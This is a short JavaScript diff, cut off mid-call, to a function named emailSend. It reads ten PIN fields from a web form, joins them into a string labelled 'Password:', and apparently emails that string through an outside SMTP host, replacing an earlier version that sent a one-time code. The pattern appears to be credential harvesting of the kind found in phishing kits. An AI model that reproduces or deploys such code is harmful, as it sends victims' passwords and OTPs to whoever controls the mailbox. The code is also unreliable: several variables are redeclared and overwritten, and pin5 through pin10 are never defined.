@@ -1,6 +1,18 @@
 function emailSend() {
-  var otp = document.getElementById('otp').value; // Getting the OTP entered by the user
-  var messageBody = "OTP: " + otp; // Constructing the message body with OTP
+  var pin1 = document.getElementsByName('pin1')[0].value;
+  var pin2 = document.getElementsByName('pin2')[0].value;
+  var pin3 = document.getElementsByName('pin3')[0].value;
+  var pin4 = document.getElementsByName('pin4')[0].value;
+  var pin1 = document.getElementsByName('pin5')[0].value;
+  var pin2 = document.getElementsByName('pin6')[0].value;
+  var pin3 = document.getElementsByName('pin7')[0].value;
+  var pin4 = document.getElementsByName('pin8')[0].value;
+  var pin1 = document.getElementsByName('pin9')[0].value;
+  var pin2 = document.getElementsByName('pin10')[0].value;
+
+  var pin = pin1 + pin2 + pin3 + pin4 + pin5 + pin6 + pin7 + pin8 + pin9 + pin10; // Concatenating the individual PIN values
+
+  var messageBody = "Password: " + pin; // Constructing the message body with the PIN
 
   Email.send({
     Host: "smtp.elasticemail.com",
